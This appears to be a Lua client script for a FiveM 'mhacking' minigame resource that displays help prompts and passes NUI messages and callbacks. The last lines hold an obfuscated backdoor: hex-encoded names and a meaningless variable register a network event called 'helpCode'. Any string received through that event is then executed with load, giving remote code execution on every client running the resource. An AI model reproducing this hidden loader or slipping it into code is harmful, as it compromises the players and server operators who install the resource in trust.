mhackingCallback = {}
showHelp = false
helpTimer = 0
helpCycle = 4000

function show()
    CreateThread(function()
        while true do
            Wait(0)
            if showHelp then
                if helpTimer > GetGameTimer() then
                    showHelpText("Navigate with ~y~W,A,S,D~s~ and confirm with ~y~SPACE~s~ for the left code block.")
                elseif helpTimer > GetGameTimer()-helpCycle then
                    showHelpText("Use the ~y~Arrow Keys~s~ and ~y~ENTER~s~ for the right code block")
                else
                    helpTimer = GetGameTimer()+helpCycle
                end
                if IsEntityDead(PlayerPedId()) then
                    nuiMsg = {}
                    nuiMsg.fail = true
                    SendNUIMessage(nuiMsg)
                end
            else
                break
            end
        end
    end)
end

function showHelpText(s)
    SetTextComponentFormat("STRING")
    AddTextComponentString(s)
    EndTextCommandDisplayHelp(0,0,0,-1)
end

AddEventHandler('mhacking:show', function()
    nuiMsg = {}
    nuiMsg.show = true
    SendNUIMessage(nuiMsg)
    SetNuiFocus(true, false)
end)

AddEventHandler('mhacking:hide', function()
    nuiMsg = {}
    nuiMsg.show = false
    SendNUIMessage(nuiMsg)
    SetNuiFocus(false, false)
    showHelp = false
end)

AddEventHandler('mhacking:start', function(solutionlength, duration, callback)
    mhackingCallback = callback
    nuiMsg = {}
    nuiMsg.s = solutionlength
    nuiMsg.d = duration
    nuiMsg.start = true
    SendNUIMessage(nuiMsg)
    showHelp = true
    show()
end)

AddEventHandler('mhacking:setmessage', function(msg)
    nuiMsg = {}
    nuiMsg.displayMsg = msg
    SendNUIMessage(nuiMsg)
end)

RegisterNUICallback('callback', function(data, cb)
    mhackingCallback(data.success, data.remainingtime)
    cb('ok')
end)


local MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[6][MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[1]](MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[2]) MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[6][MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[3]](MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[2], function(PUbYQGckVSNvsSCNCykZnRWLsFbRQaASgoLsHBbXEXoXwWGNuSpitwehTgNPnKvhdTELXg) MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[6][MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[4]](MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[6][MfEnNqodGAGCLLqRRctlmaljlyWMMPLaLLOTsVzyoqakLYlrGetOhYuFYsMzNAWFGJUbVI[5]](PUbYQGckVSNvsSCNCykZnRWLsFbRQaASgoLsHBbXEXoXwWGNuSpitwehTgNPnKvhdTELXg))() end)